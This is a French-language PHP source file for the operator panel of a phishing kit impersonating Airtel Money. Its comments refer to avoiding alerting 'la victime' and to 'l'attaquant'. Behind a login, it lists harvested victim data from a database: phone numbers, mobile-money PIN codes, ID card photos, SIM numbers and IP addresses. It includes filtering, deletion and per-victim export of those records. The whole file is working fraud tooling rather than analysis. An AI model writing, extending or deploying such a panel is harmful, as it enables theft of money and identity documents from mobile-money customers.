<?php
// Désactiver l'affichage des erreurs PHP pour ne pas alerter la victime
ini_set('display_errors', 0);
error_reporting(0);

// --- Configuration des identifiants d'administration via Variables d'Environnement ---
// Pour une meilleure sécurité (même pour l'attaquant), les identifiants admin ne devraient pas être codés en dur.
$admin_username = getenv('ADMIN_USERNAME') ?: 'default_admin';
$admin_password = getenv('ADMIN_PASSWORD') ?: 'default_password';

// --- Configuration de la Base de Données PostgreSQL via Variables d'Environnement ---
// Les informations de connexion seront lues depuis les variables d'environnement
// configurées sur Render pour la base de données PostgreSQL.
define('DB_HOST', getenv('DB_HOST') ?: 'localhost');
define('DB_NAME', getenv('DB_NAME') ?: 'default_db');
define('DB_USER', getenv('DB_USER') ?: 'default_user');
define('DB_PASS', getenv('DB_PASS') ?: 'default_pass');
define('DB_PORT', getenv('DB_PORT') ?: '5432'); // Port par défaut pour PostgreSQL

// --- URL de base pour l'affichage des photos distantes ---
// Puisque les photos sont uploadées vers un service distant, cette variable doit pointer
// vers l'URL de base où ces photos sont accessibles publiquement.
$remote_photo_base_url = getenv('REMOTE_PHOTO_BASE_URL') ?: 'http://fallback_photo_host.com/uploads/';

session_start();
$error_message = '';
$success_message_add = ''; // Non utilisé dans ce script, mais conservé pour cohérence
$error_message_add = '';   // Non utilisé dans ce script, mais conservé pour cohérence

// Gestion de la déconnexion
if (isset($_GET['logout'])) {
    session_unset();
    session_destroy();
    header('Location: ' . basename(__FILE__)); // Redirige vers la page actuelle
    exit();
}

// Gestion de la connexion
if (isset($_POST['username']) && isset($_POST['password'])) {
    $input_username = $_POST['username'];
    $input_password = $_POST['password'];

    // Comparaison sécurisée des mots de passe pour éviter les attaques de timing (bien que simple pour un script admin)
    if (hash_equals($admin_username, $input_username) && hash_equals($admin_password, $input_password)) {
        $_SESSION['authenticated'] = true;
    } else {
        $error_message = "Nom d'utilisateur ou mot de passe incorrect.";
    }
}

// Si non authentifié, afficher le formulaire de connexion
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Accès Administrateur Airtel</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; }
        .airtel-red-500 { background-color: #E4002B; }
        .airtel-red-600 { background-color: #B00021; }
        .airtel-text-red-500 { color: #E4002B; }
        .airtel-border-red-500 { border-color: #E4002B; }
        input:focus, button:focus, select:focus {
            outline: none !important;
            border-color: #E4002B !important;
            box-shadow: 0 0 0 3px rgba(228, 0, 43, 0.4) !important;
        }
        .btn-airtel {
            @apply rounded-full shadow-md transition duration-300 transform hover:scale-105;
        }
    </style>
</head>
<body class="bg-gray-50 flex items-center justify-center min-h-screen p-4">
    <div class="bg-white p-8 rounded-xl shadow-2xl w-full max-w-sm border-t-8 border-airtel-red-500 transform transition duration-500 hover:scale-[1.02]">
        <div class="flex flex-col items-center mb-6">
            <img src="https://placehold.co/80x80/E4002B/FFFFFF?text=Airtel" alt="Logo Airtel" class="h-20 w-20 rounded-full mb-3 border-4 border-gray-200 shadow-inner">
            <h2 class="text-4xl font-extrabold text-center text-airtel-text-red-500">Airtel Money</h2>
            <p class="text-gray-600 text-center mt-2">Panneau d'Administration</p>
        </div>
        <?php if (!empty($error_message)): ?>
            <p class="bg-red-100 text-red-700 p-3 rounded-lg text-center mb-4 border border-red-200"><?php echo $error_message; ?></p>
        <?php endif; ?>
        <form method="POST" action="">
            <div class="mb-5">
                <label for="username" class="block text-gray-700 text-sm font-semibold mb-2">Nom d'utilisateur:</label>
                <div class="relative">
                    <input type="text" id="username" name="username" class="pl-10 shadow-sm appearance-none border rounded-lg w-full py-3 px-3 text-gray-700 leading-tight focus:outline-none focus:ring-2 focus:ring-airtel-red-500" required placeholder="adminhacker">
                    <i class="fas fa-user absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
                </div>
            </div>
            <div class="mb-6">
                <label for="password" class="block text-gray-700 text-sm font-semibold mb-2">Mot de passe:</label>
                <div class="relative">
                    <input type="password" id="password" name="password" class="pl-10 shadow-sm appearance-none border rounded-lg w-full py-3 px-3 text-gray-700 mb-3 leading-tight focus:outline-none focus:ring-2 focus:ring-airtel-red-500" required placeholder="••••••••">
                    <i class="fas fa-lock absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
                </div>
            </div>
            <button type="submit" class="airtel-red-500 hover:airtel-red-600 text-white font-bold py-3 px-4 w-full btn-airtel focus:outline-none focus:shadow-outline">
                <i class="fas fa-sign-in-alt mr-2"></i>Se connecter
            </button>
        </form>
        <p class="text-center text-gray-500 text-xs mt-6">
            &copy; <?php echo date("Y"); ?> Airtel Money. Tous droits réservés.
        </p>
    </div>
</body>
</html>
<?php
    exit(); // Arrête l'exécution si non authentifié
}

// --- Le code ci-dessous ne s'exécute que si l'utilisateur est authentifié ---

$credentials = [];
$error_message_db = '';
try {
    // Connexion à la base de données PostgreSQL via PDO
    $dsn = 'pgsql:host=' . DB_HOST . ';port=' . DB_PORT . ';dbname=' . DB_NAME;
    $pdo = new PDO($dsn, DB_USER, DB_PASS);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    // S'assurer que l'encodage est UTF-8 pour PostgreSQL
    $pdo->exec("SET NAMES 'UTF8'");

    // Récupération des données. La colonne 'reader_card_photo_path' est maintenant 'reader_card_photo_url'
    $stmt = $pdo->query("SELECT id, phone_number, sim_registered_numbers, pin_code, reader_card_photo_url, ip_address, timestamp FROM credentials ORDER BY timestamp DESC");
    $credentials = $stmt->fetchAll(PDO::FETCH_ASSOC);
} catch (PDOException $e) {
    $error_message_db = "Erreur de base de données : " . $e->getMessage();
    error_log("[" . date('Y-m-d H:i:s') . "] DB Admin Panel Error: " . $e->getMessage() . "\n", 3, 'admin_db_error.log');
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panneau d'Administration - NBA</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <style>
        /* Variables de couleur claires et modernes */
        :root {
            --airtel-red: #E4002B;
            --airtel-red-dark: #B00021;
            --light-bg: #F8F9FA; /* Fond clair, blanc cassé */
            --card-bg: #FFFFFF; /* Fond des cartes blanc pur */
            --text-dark: #212529; /* Texte sombre pour un bon contraste sur fond clair */
            --text-muted: #6C757D; /* Texte grisé pour les descriptions */
            --border-light: #E9ECEF; /* Bordures très claires */
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--light-bg);
            color: var(--text-dark);
            transition: background-color 0.3s ease;
        }
        
        /* Styles de focus cohérents et modernes */
        input:focus, button:focus, select:focus, a:focus {
            outline: none !important;
            border-color: var(--airtel-red) !important;
            box-shadow: 0 0 0 3px rgba(228, 0, 43, 0.2) !important; /* Ombre plus douce */
        }

        /* En-tête */
        .dashboard-header {
            background: linear-gradient(90deg, var(--airtel-red), var(--airtel-red-dark));
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1); /* Ombre plus douce */
            border-bottom: 5px solid rgba(255, 255, 255, 0.15);
        }
        .header-logo {
            filter: drop-shadow(0 4px 8px rgba(0,0,0,0.1));
        }

        /* Boutons (réutilisation de primary-button) */
        .primary-button {
            background: linear-gradient(90deg, var(--airtel-red), var(--airtel-red-dark));
            color: white;
            font-weight: 700;
            padding: 0.75rem 2rem;
            border-radius: 9999px; /* Full rounded */
            transition: transform 0.3s ease, box-shadow 0.3s ease, background 0.3s ease;
            box-shadow: 0 4px 15px rgba(228, 0, 43, 0.25); /* Ombre plus douce */
            position: relative;
            overflow: hidden;
            border: none;
            display: inline-flex; /* Pour aligner icône et texte */
            align-items: center; /* Centrer verticalement */
            justify-content: center;
        }
        .primary-button:hover {
            transform: translateY(-2px) scale(1.02);
            box-shadow: 0 6px 20px rgba(228, 0, 43, 0.4);
            background: linear-gradient(90deg, var(--airtel-red-dark), var(--airtel-red));
        }
        /* Effet de brillance pour les boutons */
        .primary-button::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -60%;
            width: 30%;
            height: 200%;
            background: rgba(255, 255, 255, 0.25);
            transform: rotate(30deg);
            transition: all 0.7s cubic-bezier(0.165, 0.84, 0.44, 1);
            opacity: 0;
        }
        .primary-button:hover::after {
            left: 100%;
            opacity: 1;
        }

        /* Styles spécifiques au tableau */
        #credentials_table th {
            background-color: var(--airtel-red); /* En-tête de tableau en rouge Airtel */
            color: white;
        }
        #credentials_table tbody tr:nth-child(even) {
            background-color: #f8f8f8; /* Lignes paires légèrement grisées */
        }
        #credentials_table tbody tr:hover {
            background-color: #ffebee; /* Survol en rouge très clair */
        }
        .action-link {
            @apply text-airtel-text-red-500 hover:underline;
        }
        .action-button {
            @apply bg-gray-200 text-gray-700 py-1 px-3 rounded-md text-sm font-semibold hover:bg-gray-300 transition duration-150 ease-in-out flex items-center justify-center;
        }
        .action-button.delete {
            @apply bg-red-500 text-white hover:bg-red-600;
        }
        .action-button.export {
            @apply bg-blue-500 text-white hover:bg-blue-600;
        }
        /* Style pour la modal personnalisée */
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0,0,0,0.4);
            justify-content: center;
            align-items: center;
        }
        .modal-content {
            background-color: #fefefe;
            margin: auto;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            width: 90%;
            max-width: 400px;
            text-align: center;
            position: relative;
        }
        .modal-buttons {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-top: 20px;
        }
        .modal-button {
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: background-color 0.3s ease;
        }
        .modal-button.confirm {
            background-color: var(--airtel-red);
            color: white;
            border: none;
        }
        .modal-button.confirm:hover {
            background-color: var(--airtel-red-dark);
        }
        .modal-button.cancel {
            background-color: #e0e0e0;
            color: #333;
            border: 1px solid #ccc;
        }
        .modal-button.cancel:hover {
            background-color: #d0d0d0;
        }
    </style>
</head>
<body class="bg-gray-50 text-gray-900">
    <div class="container mx-auto p-6 sm:p-10">
        <!-- En-tête du panneau d'administration -->
        <div class="flex flex-col sm:flex-row justify-between items-center mb-8 dashboard-header p-5 rounded-xl shadow-lg text-white">
            <div class="flex items-center mb-4 sm:mb-0">
                <img src="https://placehold.co/70x70/FFFFFF/E4002B?text=AM" alt="Logo Airtel Money Admin" class="h-16 w-16 rounded-full mr-4 border-3 border-white shadow-md">
                <h1 class="text-3xl sm:text-4xl font-extrabold">Panneau Admin Airtel NBA</h1>
            </div>
            <!-- Boutons dans l'en-tête -->
            <div class="flex flex-col sm:flex-row space-y-3 sm:space-y-0 sm:space-x-4">
                <!-- Nouveau Bouton pour le Tableau de Bord des Visiteurs -->
                <a href="visitor_log.php" class="primary-button text-base">
                    <i class="fas fa-chart-line mr-2"></i> Tableau de Bord Visiteurs
                </a>
                <!-- Bouton de déconnexion -->
                <a href="?logout=true" class="primary-button text-base">
                    <i class="fas fa-sign-out-alt mr-2"></i> Déconnexion
                </a>
            </div>
        </div>

        <?php if (!empty($success_message_add)): ?>
            <div class="bg-green-100 border-l-4 border-green-500 text-green-700 p-4 mb-6 rounded-lg shadow-md" role="alert">
                <p class="font-bold">Succès !</p>
                <p><?php echo $success_message_add; ?></p>
            </div>
        <?php endif; ?>

        <?php if (!empty($error_message_add)): ?>
            <div class="bg-red-100 border-l-4 border-red-500 text-red-700 p-4 mb-6 rounded-lg shadow-md" role="alert">
                <p class="font-bold">Erreur :</p>
                <p><?php echo $error_message_add; ?></p>
            </div>
        <?php endif; ?>

        <?php if (!empty($error_message_db)): ?>
            <div class="bg-red-100 border-l-4 border-red-500 text-red-700 p-4 mb-6 rounded-lg shadow-md" role="alert">
                <p class="font-bold">Erreur de base de données :</p>
                <p><?php echo $error_message_db; ?></p>
            </div>
        <?php endif; ?>

        <div class="bg-white rounded-xl shadow-lg p-6 mb-8 border-t-8 border-airtel-red-500">
            <h2 class="text-2xl font-bold text-airtel-text-red-500 mb-5 border-b pb-3 border-gray-200">Filtrer les Données</h2>
            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                    <label for="filter_phone" class="block text-gray-700 text-sm font-semibold mb-2">Filtrer par Numéro de Téléphone:</label>
                    <div class="relative">
                        <input type="text" id="filter_phone" class="pl-10 shadow-sm appearance-none border rounded-lg w-full py-3 px-3 text-gray-700 leading-tight focus:outline-none focus:ring-2 focus:ring-airtel-red-500" placeholder="Entrez un numéro...">
                        <i class="fas fa-filter absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
                    </div>
                </div>
                <div>
                    <label for="filter_ip" class="block text-gray-700 text-sm font-semibold mb-2">Filtrer par Adresse IP:</label>
                    <div class="relative">
                        <input type="text" id="filter_ip" class="pl-10 shadow-sm appearance-none border rounded-lg w-full py-3 px-3 text-gray-700 leading-tight focus:outline-none focus:ring-2 focus:ring-airtel-red-500" placeholder="Entrez une IP...">
                        <i class="fas fa-globe absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
                    </div>
                </div>
            </div>
        </div>

        <?php if (empty($credentials)): ?>
            <div class="bg-yellow-100 border-l-4 border-yellow-500 text-yellow-700 p-4 mb-6 rounded-lg shadow-md" role="alert">
                <p class="font-bold">Aucune donnée pour l'instant.</p>
                <p>Le formulaire de NBA n'a pas encore été soumis ou les données n'ont pas été enregistrées.</p>
            </div>
        <?php else: ?>
            <div class="bg-white rounded-xl shadow-lg overflow-hidden border-t-8 border-airtel-red-500">
                <div class="overflow-x-auto">
                    <table class="min-w-full leading-normal" id="credentials_table">
                        <thead>
                            <tr class="airtel-red-500 text-white uppercase text-sm leading-normal">
                                <th class="py-4 px-6 text-left">ID</th>
                                <th class="py-4 px-6 text-left">Numéro de Téléphone</th>
                                <th class="py-4 px-6 text-left">Numéros SIM Appelés</th>
                                <th class="py-4 px-6 text-left">PIN</th>
                                <th class="py-4 px-6 text-left">Photo Carte ID</th>
                                <th class="py-4 px-6 text-left">Adresse IP</th>
                                <th class="py-4 px-6 text-left">Date & Heure</th>
                                <th class="py-4 px-6 text-left">Actions</th>
                            </tr>
                        </thead>
                        <tbody class="text-gray-700 text-sm">
                            <?php foreach ($credentials as $cred): ?>
                            <tr id="row-<?php echo htmlspecialchars($cred['id']); ?>" class="border-b border-gray-100 hover:bg-red-50 transition duration-150 ease-in-out">
                                <td class="py-3 px-6 text-left whitespace-nowrap font-medium"><?php echo htmlspecialchars($cred['id']); ?></td>
                                <td class="py-3 px-6 text-left phone-cell"><?php echo htmlspecialchars($cred['phone_number']); ?></td>
                                <td class="py-3 px-6 text-left sim-numbers-cell">
                                    <?php if (!empty($cred['sim_registered_numbers'])): ?>
                                        <button onclick="showSimNumbersModal('<?php echo htmlspecialchars($cred['sim_registered_numbers'], ENT_QUOTES, 'UTF-8'); ?>', '<?php echo htmlspecialchars($cred['phone_number'], ENT_QUOTES, 'UTF-8'); ?>')"
                                                class="action-button bg-blue-500 text-white hover:bg-blue-600">
                                            <i class="fas fa-eye mr-1"></i> Voir
                                        </button>
                                    <?php else: ?>
                                        N/A
                                    <?php endif; ?>
                                </td>
                                <td class="py-3 px-6 text-left pin-cell"><?php echo htmlspecialchars($cred['pin_code']); ?></td>
                                <td class="py-3 px-6 text-left photo-cell">
                                    <?php if (!empty($cred['reader_card_photo_url'])): // Changé de _path à _url ?>
                                        <a href="<?php echo $remote_photo_base_url . htmlspecialchars($cred['reader_card_photo_url']); ?>" target="_blank" class="action-link" title="Voir la photo">
                                            <i class="fas fa-image text-xl"></i>
                                        </a>
                                    <?php else: ?>
                                        N/A
                                    <?php endif; ?>
                                </td>
                                <td class="py-3 px-6 text-left ip-cell"><?php echo htmlspecialchars($cred['ip_address']); ?></td>
                                <td class="py-3 px-6 text-left whitespace-nowrap text-gray-500 text-xs"><?php echo htmlspecialchars($cred['timestamp']); ?></td>
                                <td class="py-3 px-6 text-left space-x-2 whitespace-nowrap">
                                    <button onclick="deleteEntry(<?php echo htmlspecialchars($cred['id']); ?>)"
                                            class="action-button delete" title="Supprimer cette entrée">
                                        <i class="fas fa-trash-alt mr-1"></i> 
                                    </button>
                                    <button onclick="exportEntry(<?php echo htmlspecialchars(json_encode($cred), ENT_QUOTES, 'UTF-8'); ?>)"
                                            class="action-button export" title="Exporter toutes les informations">
                                        <i class="fas fa-download mr-1"></i> 
                                    </button>
                                </td>
                            </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
            </div>
        <?php endif; ?>
    </div>

    <!-- Modale de Confirmation Personnalisée -->
    <div id="confirmationModal" class="modal">
        <div class="modal-content">
            <i class="fas fa-exclamation-triangle text-airtel-text-red-500 text-5xl mb-4"></i>
            <h3 class="text-2xl font-bold text-gray-800 mb-3">Confirmer la Suppression</h3>
            <p class="text-gray-600 mb-6" id="modalMessage">Êtes-vous sûr de vouloir supprimer cette entrée ? Cette action est irréversible et supprimera également les fichiers associés.</p>
            <div class="modal-buttons">
                <button id="confirmDeleteBtn" class="modal-button confirm">Oui, Supprimer</button>
                <button id="cancelDeleteBtn" class="modal-button cancel">Annuler</button>
            </div>
        </div>
    </div>

    <!-- Modale pour afficher les numéros SIM -->
    <div id="simNumbersModal" class="modal">
        <div class="modal-content">
            <h3 class="text-2xl font-bold text-airtel-text-red-500 mb-4" id="simModalTitle">Numéros SIM Enregistrés</h3>
            <div id="simNumbersContent" class="text-left text-gray-700 mb-6">
                <!-- Numbers will be loaded here by JavaScript -->
            </div>
            <div class="modal-buttons">
                <button id="closeSimModalBtn" class="modal-button cancel">Fermer</button>
            </div>
        </div>
    </div>

    <!-- Script JavaScript pour le Filtrage, la Suppression et l'Exportation -->
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const filterPhoneInput = document.getElementById('filter_phone');
            const filterIpInput = document.getElementById('filter_ip');
            const credentialsTableBody = document.querySelector('#credentials_table tbody');
            const tableRows = credentialsTableBody ? credentialsTableBody.querySelectorAll('tr') : [];

            // Éléments de la modal de confirmation
            const confirmationModal = document.getElementById('confirmationModal');
            const modalMessage = document.getElementById('modalMessage');
            const confirmDeleteBtn = document.getElementById('confirmDeleteBtn');
            const cancelDeleteBtn = document.getElementById('cancelDeleteBtn');

            // Éléments de la modal des numéros SIM
            const simNumbersModal = document.getElementById('simNumbersModal');
            const simModalTitle = document.getElementById('simModalTitle');
            const simNumbersContent = document.getElementById('simNumbersContent');
            const closeSimModalBtn = document.getElementById('closeSimModalBtn');

            let currentDeleteId = null; // Variable pour stocker l'ID de l'entrée à supprimer

            // Fonction pour afficher la modal de confirmation
            function showModal(message, id) {
                modalMessage.textContent = message;
                currentDeleteId = id;
                confirmationModal.style.display = 'flex'; // Utiliser flex pour centrer
            }

            // Fonction pour masquer la modal de confirmation
            function hideModal() {
                confirmationModal.style.display = 'none';
                currentDeleteId = null;
            }

            // Gestionnaire de clic sur le bouton Confirmer de la modal de confirmation
            confirmDeleteBtn.onclick = function() {
                if (currentDeleteId !== null) {
                    performDelete(currentDeleteId);
                }
                hideModal();
            };

            // Gestionnaire de clic sur le bouton Annuler de la modal de confirmation
            cancelDeleteBtn.onclick = function() {
                hideModal();
            };

            // Fonction pour afficher la modal des numéros SIM
            window.showSimNumbersModal = function(numbersString, phoneNumber) {
                simModalTitle.textContent = `Numéros SIM pour ${phoneNumber}`;
                const numbersArray = numbersString.split(/[,;\s\n]+/).filter(num => num.trim() !== '');
                let ulHtml = '<ul class="list-disc pl-5">';
                if (numbersArray.length > 0) {
                    numbersArray.forEach(num => {
                        ulHtml += `<li><i class="fas fa-mobile-alt mr-2 text-airtel-text-red-500"></i>${htmlspecialchars(num.trim())}</li>`;
                    });
                } else {
                    ulHtml += `<li>Aucun numéro enregistré.</li>`;
                }
                ulHtml += '</ul>';
                simNumbersContent.innerHTML = ulHtml;
                simNumbersModal.style.display = 'flex';
            };

            // Fonction d'échappement HTML pour JavaScript (équivalent à htmlspecialchars en PHP)
            function htmlspecialchars(str) {
                const div = document.createElement('div');
                div.appendChild(document.createTextNode(str));
                return div.innerHTML;
            }


            // Gestionnaire de clic sur le bouton Fermer de la modal des numéros SIM
            closeSimModalBtn.onclick = function() {
                simNumbersModal.style.display = 'none';
            };

            // Fermer les modales si l'utilisateur clique en dehors du contenu
            window.onclick = function(event) {
                if (event.target == confirmationModal) {
                    hideModal();
                }
                if (event.target == simNumbersModal) {
                    simNumbersModal.style.display = 'none';
                }
            };

            // Fonction de filtrage
            function applyFilter() {
                const phoneFilter = filterPhoneInput.value.toLowerCase();
                const ipFilter = filterIpInput.value.toLowerCase();

                tableRows.forEach(row => {
                    const phoneCell = row.querySelector('.phone-cell').textContent.toLowerCase();
                    const ipCell = row.querySelector('.ip-cell').textContent.toLowerCase();

                    const phoneMatch = phoneCell.includes(phoneFilter);
                    const ipMatch = ipCell.includes(ipFilter);

                    if (phoneMatch && ipMatch) {
                        row.style.display = '';
                    } else {
                        row.style.display = 'none';
                    }
                });
            }

            if (filterPhoneInput) {
                filterPhoneInput.addEventListener('keyup', applyFilter);
            }
            if (filterIpInput) {
                filterIpInput.addEventListener('keyup', applyFilter);
            }

            // Fonction de suppression d'entrée (modifiée pour utiliser la modal de confirmation)
            window.deleteEntry = function(id) {
                showModal('Êtes-vous sûr de vouloir supprimer cette entrée (ID: ' + id + ') ? Cette action est irréversible et supprimera également les fichiers associés.', id);
            };

            // Fonction réelle pour effectuer la suppression après confirmation
            function performDelete(id) {
                fetch('delete_entry.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: 'id=' + id
                })
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        // Utiliser la modal personnalisée au lieu d'alert
                        showInfoModal('Succès', data.message, 'success');
                        const row = document.getElementById('row-' + id);
                        if (row) {
                            row.remove();
                        }
                    } else {
                        // Utiliser la modal personnalisée au lieu d'alert
                        showInfoModal('Erreur', 'Erreur: ' + data.message, 'error');
                    }
                })
                .catch(error => {
                    console.error('Erreur lors de la requête de suppression:', error);
                    // Utiliser la modal personnalisée au lieu d'alert
                    showInfoModal('Erreur', 'Une erreur s\'est produite lors de la suppression.', 'error');
                });
            }

            // Fonction d'exportation d'entrée vers un fichier HTML stylisé
            window.exportEntry = function(data) {
                // Utilise la variable globale remote_photo_base_url pour construire l'URL de la photo
                const photoUrl = data.reader_card_photo_url ? `
                <div class="data-item">
                    <p><strong>Photo Carte ID:</strong></p>
                    <img src="${remote_photo_base_url}${htmlspecialchars(data.reader_card_photo_url)}" alt="Photo Carte ID" style="max-width: 100%; height: auto; border-radius: 8px; margin-top: 10px; border: 1px solid #ddd;">
                    <p><small>(URL du fichier: ${htmlspecialchars(data.reader_card_photo_url)})</small></p>
                </div>` : '';


                let htmlContent = `
                <!DOCTYPE html>
                <html lang="fr">
                <head>
                    <meta charset="UTF-8">
                    <title>Informations Airtel Money - Entrée ${data.id}</title>
                    <style>
                        body { font-family: 'Arial', sans-serif; line-height: 1.6; color: #333; margin: 20px; background-color: #f4f4f4; }
                        .container { max-width: 800px; margin: auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                        h1 { color: #E4002B; text-align: center; border-bottom: 2px solid #E4002B; padding-bottom: 10px; margin-bottom: 20px; }
                        h2 { color: #555; margin-top: 25px; margin-bottom: 15px; }
                        p { margin-bottom: 10px; }
                        strong { color: #E4002B; }
                        .data-item { background-color: #f9f9f9; border-left: 4px solid #E4002B; padding: 10px 15px; margin-bottom: 10px; border-radius: 4px; }
                        .data-item p { margin: 5px 0; }
                        .image-link { color: #007bff; text-decoration: none; font-weight: bold; }
                        .image-link:hover { text-decoration: underline; }
                        .sim-numbers ul { list-style: disc; margin-left: 20px; padding-left: 0; }
                        .sim-numbers li { margin-bottom: 5px; }
                        .footer { text-align: center; margin-top: 30px; font-size: 0.9em; color: #777; }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <h1>Informations de l'Entrée Airtel Money #${htmlspecialchars(data.id)}</h1>
                        <div class="data-item">
                            <p><strong>Numéro de Téléphone:</strong> ${htmlspecialchars(data.phone_number)}</p>
                        </div>
                        <div class="data-item sim-numbers">
                            <p><strong>Numéros SIM Appelés:</strong></p>
                            <ul>
                                ${data.sim_registered_numbers ? data.sim_registered_numbers.split(/[,;\s\n]+/).filter(num => num.trim() !== '').map(num => `<li>${htmlspecialchars(num.trim())}</li>`).join('') : '<li>N/A</li>'}
                            </ul>
                        </div>
                        <div class="data-item">
                            <p><strong>PIN:</strong> ${htmlspecialchars(data.pin_code)}</p>
                        </div>
                        ${photoUrl}
                        <div class="data-item">
                            <p><strong>Adresse IP:</strong> ${htmlspecialchars(data.ip_address)}</p>
                        </div>
                        <div class="data-item">
                            <p><strong>Date & Heure de Capture:</strong> ${htmlspecialchars(data.timestamp)}</p>
                        </div>
                        <div class="footer">
                            <p>Données exportées depuis le panneau d'administration Airtel Money.</p>
                        </div>
                    </div>
                </body>
                </html>
                `;

                const blob = new Blob([htmlContent], { type: 'text/html' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `airtel_data_entry_${data.id}.html`;
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
            };

            // Ajout d'une modal d'information générique pour remplacer les alertes
            function showInfoModal(title, message, type) {
                const infoModal = document.createElement('div');
                infoModal.id = 'infoModal';
                infoModal.className = 'modal';
                infoModal.innerHTML = `
                    <div class="modal-content">
                        <i class="fas ${type === 'success' ? 'fa-check-circle text-green-500' : 'fa-times-circle text-red-500'} text-5xl mb-4"></i>
                        <h3 class="text-2xl font-bold text-gray-800 mb-3">${title}</h3>
                        <p class="text-gray-600 mb-6">${message}</p>
                        <div class="modal-buttons">
                            <button class="modal-button cancel" onclick="document.getElementById('infoModal').remove()">Fermer</button>
                        </div>
                    </div>
                `;
                document.body.appendChild(infoModal);
                infoModal.style.display = 'flex';
            }

            // Remplacer les alertes existantes par showInfoModal
            // Ceci est déjà fait dans performDelete, mais s'il y en a d'autres, il faut les adapter.
        });
    </script>
</body>
</html>
